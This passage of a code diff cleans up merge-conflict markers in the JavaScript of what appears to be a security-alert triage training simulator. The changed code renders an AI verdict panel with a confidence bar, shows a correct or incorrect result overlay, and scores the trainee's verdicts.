       ${resolved ? renderResultOverlay(a, resolved) : ''}
-=======
-      ${resolved?renderResultOverlay(a,resolved):''}
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
     </div>`;
 
   updateProgress();
 }
 
-<<<<<<< HEAD
 function renderAIPanel(a) {
   const loading = state.aiLoading[a.id];
   const ai = state.aiData[a.id];
@@ -577,33 +286,11 @@ function renderAIPanel(a) {
     const vLabel = ai.verdict === 'REVIEW' ? 'REVIEW' : ai.verdict === 'UNCERTAIN' ? 'UNCERTAIN' : ai.verdict || 'UNCERTAIN';
 
     const verdictRow = `<div class="ai-verdict-row">
-=======
-function renderAIPanel(a){
-  const loading=state.aiLoading[a.id];
-  const ai=state.aiData[a.id];
-  const modeLabel={verdict:'MODE: VERDICT + REASON',indicators:'MODE: INDICATOR HIGHLIGHT',question:'MODE: GUIDED INQUIRY'}[a.aiMode];
-
-  let inner='';
-  if(loading||(!ai&&!loading&&state.aiLoading[a.id]!==false)){
-    inner=`<div class="ai-loading"><div class="ai-spinner"></div><span>Claude is analyzing this alert...</span></div>`;
-  } else if(!ai){
-    inner=`<div class="ai-loading"><div class="ai-spinner"></div><span>Connecting to Claude API...</span></div>`;
-  } else if(ai.error){
-    inner=`<div class="ai-loading" style="color:#ef5350;">AI analysis unavailable for this alert.</div>`;
-  } else {
-    const conf=ai.confidence||50;
-    const confClass=conf>=85?'conf-high':conf>=60?'conf-med':'conf-low';
-    const vcls=ai.verdict==='TP'?'verdict-tp':ai.verdict==='FP'?'verdict-fp':'verdict-uncertain';
-    const vLabel=ai.verdict==='REVIEW'?'REVIEW':ai.verdict==='UNCERTAIN'?'UNCERTAIN':ai.verdict||'UNCERTAIN';
-
-    const verdictRow=`<div class="ai-verdict-row">
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
       <div class="verdict-chip ${vcls}">${vLabel}</div>
       <div class="confidence-bar-wrap"><div class="confidence-bar ${confClass}" style="width:${conf}%"></div></div>
       <div class="confidence-label">${conf}%</div>
     </div>`;
 
-<<<<<<< HEAD
     const indicators = (ai.indicators || []).map(i =>
       `<span class="indicator-tag ind-${i.type||'neutral'}">${i.text}</span>`
     ).join('');
@@ -618,18 +305,6 @@ function renderAIPanel(a){
     inner = `${verdictRow}
       <div class="ai-reasoning">${ai.reasoning||''}</div>
       ${indicators ? `<div class="ai-indicators">${indicators}</div>` : ''}
-=======
-    const indicators=(ai.indicators||[]).map(i=>`<span class="indicator-tag ind-${i.type||'neutral'}">${i.text}</span>`).join('');
-
-    const questionBlock=a.aiMode==='question'&&ai.question?`<div class="ai-question">
-      <p>${ai.question}</p>
-      <div class="ai-q-buttons">${(ai.options||[]).map((o,i)=>`<button class="ai-q-btn" onclick="this.parentElement.parentElement.innerHTML='<p style=color:#66bb6a;font-family:JetBrains Mono,monospace;font-size:12px>Context noted: \\'${o}\\' — proceed with your verdict.</p>'">${o}</button>`).join('')}</div>
-    </div>`:'';
-
-    inner=`${verdictRow}
-      <div class="ai-reasoning">${ai.reasoning||''}</div>
-      ${indicators?`<div class="ai-indicators">${indicators}</div>`:''}
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
       ${questionBlock}`;
   }
 
@@ -643,11 +318,7 @@ function renderAIPanel(a){
   </div>`;
 }
 
-<<<<<<< HEAD
 function renderResultOverlay(a, resolved) {
-=======
-function renderResultOverlay(a,resolved){
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
   return `<div class="result-overlay">
     <div class="result-title" style="color:${resolved.correct?'#66bb6a':'#ef5350'}">${resolved.correct?'Correct':'Incorrect'}</div>
     <div class="result-sub">This was a <strong>${a.answer}</strong>. You marked ${resolved.verdict}.</div>
@@ -656,7 +327,6 @@ function renderResultOverlay(a,resolved){
   </div>`;
 }
 
-<<<<<<< HEAD
 function submitVerdict(verdict) {
   const a = ALERTS.find(x => x.id === state.selected);
   if (!a || state.resolved[a.id]) return;
@@ -685,34 +355,7 @@ function updateProgress() {
   document.getElementById('prog-correct').textContent = state.score;
 }
 
-// ── Boot ──────────────────────────────────────────────────────────────────────
 initSimulator();
-=======
-function submitVerdict(verdict){
-  const a=ALERTS.find(x=>x.id===state.selected);
-  if(!a||state.resolved[a.id])return;
-  const correct=verdict===a.answer||(verdict==='ESCALATE'&&a.answer==='TP');
-  state.resolved[a.id]={verdict,correct};
-  state.total++;
-  if(correct)state.score++;
-  document.getElementById('score-display').textContent=`Score: ${state.score} / ${state.total}`;
-  renderSidebar();
-  renderDetail();
-}
-
-function nextAlert(){
-  const next=ALERTS.find(a=>!state.resolved[a.id]);
-  if(next)selectAlert(next.id);
-}
-
-function updateProgress(){
-  const vals=Object.values(state.resolved);
-  document.getElementById('prog-resolved').textContent=vals.length;
-  document.getElementById('prog-tp').textContent=vals.filter(r=>r.verdict==='TP'||r.verdict==='ESCALATE').length;
-  document.getElementById('prog-fp').textContent=vals.filter(r=>r.verdict==='FP').length;
-  document.getElementById('prog-correct').textContent=state.score;
-}
-
-renderSidebar();
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
 </script>
+</body>
+</html>
